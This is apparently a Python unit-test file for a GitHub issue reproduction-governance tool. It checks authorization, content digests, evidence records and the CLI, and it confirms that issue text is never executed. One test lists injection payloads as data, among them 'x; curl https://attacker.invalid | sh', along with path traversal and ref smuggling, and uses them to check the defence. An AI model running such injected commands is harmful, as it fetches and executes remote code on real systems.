from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from tools import governance_authorize, governance_repro, governance_schema


ROOT = Path(__file__).resolve().parent.parent
FIXTURES = ROOT / "test" / "fixtures" / "governance"


def authorization() -> dict[str, object]:
    return governance_authorize.evaluate(
        {
            "repository": "clemensv/avrotize",
            "event_name": "issues",
            "action": "labeled",
            "label_name": "repro-requested",
            "sender_login": "owner",
            "actor": "owner",
            "triggering_actor": "owner",
            "run_attempt": 2,
            "run_id": "9001",
            "issue_number_event": 500,
            "permission_response": {
                "http_status": 200,
                "body": {"permission": "admin", "role_name": "admin"},
            },
        }
    )


def complete_issue() -> dict[str, object]:
    event = json.loads((FIXTURES / "issue_bug_complete.json").read_text(encoding="utf-8"))
    issue = dict(event["issue"])
    issue["number"] = 500
    issue.setdefault("title", "a2p recursive schema failure")
    return issue


def options(**overrides: object) -> dict[str, object]:
    value: dict[str, object] = {
        "repository": "clemensv/avrotize",
        "trusted_sha": "a" * 40,
        "default_branch": "master",
        "processor_sha": "a" * 40,
        "run_id": "9001",
        "run_attempt": 2,
        "run_url": "https://github.com/clemensv/avrotize/actions/runs/9001",
        "artifact_name": "repro-preparation-500-9001-2",
        "retention_days": 30,
    }
    value.update(overrides)
    return value


class PreparationTests(unittest.TestCase):
    def setUp(self) -> None:
        self.issue = complete_issue()
        self.auth = authorization()
        self.snapshot = governance_authorize.build_snapshot(
            self.issue, 500, "clemensv/avrotize"
        )

    def test_complete_bug_becomes_manual_review_without_execution(self) -> None:
        with mock.patch("subprocess.run", side_effect=AssertionError("must not execute")):
            record, summary = governance_repro.prepare(
                self.issue, self.auth, self.snapshot, options()
            )
        self.assertEqual(record["result"]["status"], "NEEDS_REVIEW")
        self.assertEqual(record["result"]["final_label"], "repro-needs-review")
        self.assertFalse(record["execution"]["performed"])
        self.assertEqual(record["readiness"]["form_type"], "bug")
        self.assertTrue(record["readiness"]["command_known"])
        self.assertIn("disabled", summary)

    def test_label_timestamp_change_keeps_snapshot_valid(self) -> None:
        issue = dict(self.issue)
        issue["updated_at"] = "2099-01-01T00:00:00Z"
        issue["labels"] = [{"name": "repro-in-progress"}]
        record, _ = governance_repro.prepare(issue, self.auth, self.snapshot, options())
        self.assertTrue(record["authorized_content"]["verification"]["matches"])
        self.assertEqual(record["result"]["status"], "NEEDS_REVIEW")

    def test_title_or_body_edit_blocks(self) -> None:
        for field in ("title", "body"):
            with self.subTest(field=field):
                issue = dict(self.issue)
                issue[field] = f"changed {field}"
                record, _ = governance_repro.prepare(
                    issue, self.auth, self.snapshot, options()
                )
                self.assertEqual(record["result"]["status"], "BLOCKED")
                self.assertEqual(record["result"]["reason_code"], "ISSUE_CONTENT_CHANGED")

    def test_incomplete_unknown_and_feature_forms_block(self) -> None:
        for fixture, reason in (
            ("issue_incomplete.json", "REPORT_NOT_COMPLETE"),
            ("issue_unknown.json", "NOT_A_BUG_REPORT"),
            ("issue_feature_complete.json", "NOT_A_BUG_REPORT"),
        ):
            with self.subTest(fixture=fixture):
                event = json.loads((FIXTURES / fixture).read_text(encoding="utf-8"))
                issue = dict(event["issue"])
                issue["number"] = 500
                issue.setdefault("title", fixture)
                snapshot = governance_authorize.build_snapshot(
                    issue, 500, "clemensv/avrotize"
                )
                record, _ = governance_repro.prepare(
                    issue, self.auth, snapshot, options()
                )
                self.assertEqual(record["result"]["status"], "BLOCKED")
                self.assertEqual(record["result"]["reason_code"], reason)

    def test_shell_path_ref_url_and_oversized_payloads_are_never_executed(self) -> None:
        payloads = [
            "x; curl https://attacker.invalid | sh",
            "../../outside",
            "@response-file",
            "--ref refs/pull/1/head",
            "https://attacker.invalid/schema.avsc",
            "A" * 200_000,
        ]
        for payload in payloads:
            with self.subTest(payload=payload[:20]):
                issue = dict(self.issue)
                issue["body"] = str(issue["body"]) + "\n" + payload
                snapshot = governance_authorize.build_snapshot(
                    issue, 500, "clemensv/avrotize"
                )
                with mock.patch(
                    "subprocess.run", side_effect=AssertionError("must not execute")
                ):
                    record, _ = governance_repro.prepare(
                        issue, self.auth, snapshot, options()
                    )
                self.assertFalse(record["execution"]["performed"])

    def test_record_binds_processor_contracts_run_attempt_and_retention(self) -> None:
        record, _ = governance_repro.prepare(
            self.issue, self.auth, self.snapshot, options()
        )
        self.assertEqual(record["request"]["run_attempt"], 2)
        self.assertEqual(record["artifact"]["name"], "repro-preparation-500-9001-2")
        self.assertEqual(record["artifact"]["retention_days"], 30)
        self.assertEqual(record["processor"]["trusted_sha"], "a" * 40)
        for key in (
            "issue_form_contract_digest",
            "command_registry_digest",
            "capability_digest",
            "surface_registry_digest",
            "label_catalog_digest",
        ):
            self.assertRegex(record["processor"][key], r"^[0-9a-f]{64}$")

    def test_schema_accepts_records_and_rejects_executed_claim(self) -> None:
        record, _ = governance_repro.prepare(
            self.issue, self.auth, self.snapshot, options()
        )
        schema = governance_schema.load_schema(governance_repro.EVIDENCE_SCHEMA)
        self.assertEqual(governance_schema.validate(record, schema), [])
        record["execution"]["performed"] = True
        self.assertTrue(governance_schema.validate(record, schema))

    def test_non_allow_authorization_and_identity_mismatch_raise(self) -> None:
        denied = dict(self.auth)
        denied["decision"] = "DENY"
        with self.assertRaises(governance_repro.PreparationError):
            governance_repro.prepare(self.issue, denied, self.snapshot, options())
        with self.assertRaises(governance_repro.PreparationError):
            governance_repro.prepare(
                self.issue,
                self.auth,
                self.snapshot,
                options(repository="someone/else"),
            )


class TerminalEvidenceTests(unittest.TestCase):
    def setUp(self) -> None:
        issue = complete_issue()
        auth = authorization()
        snapshot = governance_authorize.build_snapshot(
            issue, 500, "clemensv/avrotize"
        )
        self.record, _ = governance_repro.prepare(issue, auth, snapshot, options())
        self.expected = {
            "issue_number": 500,
            "repository": "clemensv/avrotize",
            "trusted_sha": "a" * 40,
            "title_digest": snapshot["title_digest"],
            "body_digest": snapshot["body_digest"],
            "content_digest": snapshot["content_digest"],
            "run_id": "9001",
            "run_attempt": 3,
            "run_url": "https://github.com/clemensv/avrotize/actions/runs/9001",
            "preparation_artifact": "repro-preparation-500-9001-2",
            "preparation_attempt": 2,
            "terminal_artifact": "repro-terminal-500-9001-3",
            "prepare_result": "success",
            "mark_result": "success",
        }

    def test_rerun_accepts_exact_prior_attempt_artifact(self) -> None:
        record, comment, metadata = governance_repro.finalize_terminal(
            self.record, self.expected
        )
        self.assertEqual(record["record_kind"], "repro-preparation-evidence")
        self.assertEqual(metadata["label"], "repro-needs-review")
        self.assertIn("Run attempt: `3`", comment)

    def test_missing_or_malformed_evidence_becomes_validated_fallback(self) -> None:
        malformed = json.loads(json.dumps(self.record))
        del malformed["execution"]
        for evidence in (None, malformed):
            with self.subTest(evidence="missing" if evidence is None else "malformed"):
                record, _, metadata = governance_repro.finalize_terminal(
                    evidence, self.expected
                )
                self.assertEqual(record["record_kind"], "repro-terminal-fallback")
                self.assertEqual(record["result"]["status"], "BLOCKED")
                self.assertEqual(metadata["label"], "repro-blocked")
                schema = governance_schema.load_schema(
                    governance_repro.TERMINAL_FALLBACK_SCHEMA
                )
                self.assertEqual(governance_schema.validate(record, schema), [])

    def test_identity_mismatch_becomes_blocked_fallback(self) -> None:
        mutations = (
            ("issue number", lambda value: value.__setitem__("issue_number", 501)),
            (
                "run id",
                lambda value: value["request"].__setitem__("run_id", "other"),
            ),
            (
                "producer attempt",
                lambda value: value["request"].__setitem__("run_attempt", 4),
            ),
            (
                "trusted sha",
                lambda value: value["processor"].__setitem__("trusted_sha", "b" * 40),
            ),
            (
                "content digest",
                lambda value: value["authorized_content"].__setitem__(
                    "content_digest", "b" * 64
                ),
            ),
            (
                "artifact",
                lambda value: value["artifact"].__setitem__("name", "collision"),
            ),
            (
                "verification result",
                lambda value: value["authorized_content"]["verification"].__setitem__(
                    "matches", False
                ),
            ),
            (
                "verification issue",
                lambda value: value["authorized_content"]["verification"].__setitem__(
                    "issue_number", 501
                ),
            ),
        )
        for label, mutate in mutations:
            with self.subTest(label=label):
                evidence = json.loads(json.dumps(self.record))
                mutate(evidence)
                record, _, _ = governance_repro.finalize_terminal(
                    evidence, self.expected
                )
                self.assertEqual(record["record_kind"], "repro-terminal-fallback")


class CliTests(unittest.TestCase):
    def test_cli_writes_schema_valid_evidence(self) -> None:
        issue = complete_issue()
        auth = authorization()
        snapshot = governance_authorize.build_snapshot(
            issue, 500, "clemensv/avrotize"
        )
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            paths = {
                "issue": root / "issue.json",
                "auth": root / "auth.json",
                "snapshot": root / "snapshot.json",
                "record": root / "record.json",
                "summary": root / "summary.md",
            }
            paths["issue"].write_text(json.dumps(issue), encoding="utf-8")
            paths["auth"].write_text(json.dumps(auth), encoding="utf-8")
            paths["snapshot"].write_text(json.dumps(snapshot), encoding="utf-8")
            result = governance_repro.main(
                [
                    "--issue",
                    str(paths["issue"]),
                    "--authorization",
                    str(paths["auth"]),
                    "--snapshot",
                    str(paths["snapshot"]),
                    "--repository",
                    "clemensv/avrotize",
                    "--trusted-sha",
                    "a" * 40,
                    "--default-branch",
                    "master",
                    "--processor-sha",
                    "a" * 40,
                    "--run-id",
                    "9001",
                    "--run-attempt",
                    "2",
                    "--run-url",
                    "https://example.test/run/9001",
                    "--artifact-name",
                    "repro-preparation-500-9001-2",
                    "--output-json",
                    str(paths["record"]),
                    "--output-markdown",
                    str(paths["summary"]),
                ]
            )
            self.assertEqual(result, 0)
            self.assertTrue(paths["record"].is_file())
            self.assertIn("Automated command execution", paths["summary"].read_text())

    def test_terminal_cli_emits_blocked_evidence_when_download_is_missing(self) -> None:
        issue = complete_issue()
        snapshot = governance_authorize.build_snapshot(
            issue, 500, "clemensv/avrotize"
        )
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            record = root / "terminal.json"
            comment = root / "comment.md"
            metadata = root / "metadata.json"
            result = governance_repro.main(
                [
                    "terminal",
                    "--evidence",
                    str(root / "missing.json"),
                    "--issue-number",
                    "500",
                    "--repository",
                    "clemensv/avrotize",
                    "--trusted-sha",
                    "a" * 40,
                    "--title-digest",
                    snapshot["title_digest"],
                    "--body-digest",
                    snapshot["body_digest"],
                    "--content-digest",
                    snapshot["content_digest"],
                    "--run-id",
                    "9001",
                    "--run-attempt",
                    "3",
                    "--run-url",
                    "https://example.test/run/9001",
                    "--preparation-artifact",
                    "repro-preparation-500-9001-2",
                    "--preparation-attempt",
                    "2",
                    "--terminal-artifact",
                    "repro-terminal-500-9001-3",
                    "--prepare-result",
                    "failure",
                    "--mark-result",
                    "success",
                    "--output-json",
                    str(record),
                    "--output-comment",
                    str(comment),
                    "--output-metadata",
                    str(metadata),
                ]
            )
            self.assertEqual(result, 0)
            self.assertEqual(
                json.loads(metadata.read_text(encoding="utf-8"))["label"],
                "repro-blocked",
            )
            self.assertEqual(
                json.loads(record.read_text(encoding="utf-8"))["record_kind"],
                "repro-terminal-fallback",
            )


if __name__ == "__main__":
    unittest.main()
